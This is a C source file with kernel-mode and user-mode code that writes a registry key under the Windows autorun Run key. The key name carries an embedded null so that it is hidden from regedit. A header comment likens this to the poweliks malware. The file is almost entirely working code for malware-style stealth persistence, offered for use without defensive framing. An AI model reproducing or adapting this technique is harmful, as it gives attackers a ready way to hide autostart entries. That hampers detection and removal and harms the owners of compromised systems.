//   
// hidereg(r0&r3).c  
//   
// by ithurricane   
// https://twitter.com/ithurricanept 

//hide registry key form regedit like poweliks.

// ring0 code
NTSTATUS SetKeyValue(PWCHAR regKey, PWCHAR regKey2, ULONG_PTR keylen, PWCHAR subitem, ULONG_PTR subitemlen, PBYTE regValue, ULONG_PTR len, ULONG_PTR type) 
{
    HANDLE      hKey = 0, hKey2 = 0;
    ULONG       ulResult;    
    NTSTATUS    Status;
    CHAR byArr[8]   = {0};
    OBJECT_ATTRIBUTES Obj_Attr;
    UNICODE_STRING UStValueKey;
    UNICODE_STRING UStKeyName;
	UNICODE_STRING UStKeyName2;

	RtlInitUnicodeString(&UStKeyName, regKey);

	RtlInitUnicodeString(&UStKeyName2, regKey2);
	if(keylen > 0) UStKeyName2.Length = keylen;

	RtlInitUnicodeString(&UStValueKey, subitem);
	if(subitemlen > 0) UStValueKey.Length = subitemlen;

    InitializeObjectAttributes(&Obj_Attr, &UStKeyName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL );

    Status = ZwCreateKey( &hKey, KEY_ALL_ACCESS, &Obj_Attr, 0, NULL, REG_OPTION_NON_VOLATILE, &ulResult );	
    if ( !NT_SUCCESS(Status) ) 
	{
        KdPrint(( "ZwCreateKey = %x, %ws\n", Status, UStKeyName.Buffer));
        return Status;
    }
	else 
	{
        if( ulResult == REG_CREATED_NEW_KEY )
            KdPrint(("1 new\n"));
        else if( ulResult == REG_OPENED_EXISTING_KEY ) 
            KdPrint(("1 open\n"));
    }
 
    InitializeObjectAttributes(&Obj_Attr, &UStKeyName2, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, hKey, NULL );

    Status = ZwCreateKey( &hKey2, KEY_ALL_ACCESS, &Obj_Attr, 0, NULL, REG_OPTION_NON_VOLATILE, &ulResult );	
    if ( !NT_SUCCESS(Status) ) 
	{
        KdPrint(( "ZwCreateKey = %x, %ws\n", Status, UStKeyName.Buffer));
        return Status;
    }
	else 
	{
        if( ulResult == REG_CREATED_NEW_KEY )
            KdPrint(("2 new\n"));
        else if( ulResult == REG_OPENED_EXISTING_KEY ) 
            KdPrint(("2 open\n"));
    }

    do 
	{
        Status = ZwSetValueKey(hKey2, &UStValueKey, 0, type, regValue, len );
        if ( !NT_SUCCESS(Status) ) 
		{
            KdPrint(( "ZwSetValueKey = %x\n", Status));
            break;
        }
    } while ( FALSE );
     
    if ( hKey2 ) 
        ZwClose(hKey2);

    if ( hKey ) 
        ZwClose(hKey);
    
    return Status;
}

WCHAR HiddenKeyNameBuffer[] = L"hidekey\0";   
WCHAR HiddenValueNameBuffer[]= L"hidevalue"; 

SetKeyValue(
	 L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
	,HiddenKeyNameBuffer
	,wcslen( HiddenKeyNameBuffer ) *sizeof(WCHAR) + sizeof(WCHAR) // length here must include terminating null 
	,HiddenValueNameBuffer
	,wcslen( HiddenValueNameBuffer ) *sizeof(WCHAR)
	,HiddenValueNameBuffer
	,wcslen( HiddenValueNameBuffer ) *sizeof(WCHAR)
	,1);
	


//---------------------------------------------------------------------------------------------------	
// ring3 code
VOID LocateNTDLLEntryPoints()   
{   
    if( !(NtCreateKey = (void *) GetProcAddress( GetModuleHandle("ntdll.dll"),   
            "NtCreateKey" )) ) {   
   
        printf("Could not find NtCreateKey entry point in NTDLL.DLL\n");   
        exit(1);   
    }    
    if( !(NtSetValueKey = (void *) GetProcAddress( GetModuleHandle("ntdll.dll"),   
            "NtSetValueKey" )) ) {   
   
        printf("Could not find NtSetValueKey entry point in NTDLL.DLL\n");   
        exit(1);   
    }   
}

WCHAR HiddenKeyNameBuffer[] = L"hidekey\0";   
WCHAR HiddenValueNameBuffer[]= L"hidevalue"; 
LocateNTDLLEntryPoints();
   
KeyName.Buffer = L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";   
KeyName.Length = wcslen( L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" ) *sizeof(WCHAR);   
InitializeObjectAttributes( &ObjectAttributes, &KeyName,    
		OBJ_CASE_INSENSITIVE, NULL, NULL );   
Status = NtCreateKey( &SysKeyHandle, KEY_ALL_ACCESS,    
				&ObjectAttributes, 0, NULL, REG_OPTION_NON_VOLATILE,   
				&Disposition );   
if( !NT_SUCCESS( Status )) 
{    
	exit(1);   
}   

KeyName.Buffer = HiddenKeyNameBuffer;   
KeyName.Length = wcslen( HiddenKeyNameBuffer ) *sizeof(WCHAR) + sizeof(WCHAR);   // length here must include terminating null
InitializeObjectAttributes( &ObjectAttributes, &KeyName,    
		OBJ_CASE_INSENSITIVE, SysKeyHandle, NULL );   
Status = NtCreateKey( &HiddenKeyHandle, KEY_ALL_ACCESS,    
				&ObjectAttributes, 0, NULL, REG_OPTION_NON_VOLATILE,   
				&Disposition );   
if( !NT_SUCCESS( Status )) 
{   
	exit(1);   
}
 
ValueName.Buffer = HiddenValueNameBuffer;   
ValueName.Length = wcslen( HiddenValueNameBuffer ) *sizeof(WCHAR);   
Status = NtSetValueKey( HiddenKeyHandle, &ValueName, 0, REG_SZ,    
					HiddenValueNameBuffer,    
					wcslen( HiddenValueNameBuffer ) * sizeof(WCHAR) );   
if( !NT_SUCCESS( Status )) 
{      
	exit(1);   
}   

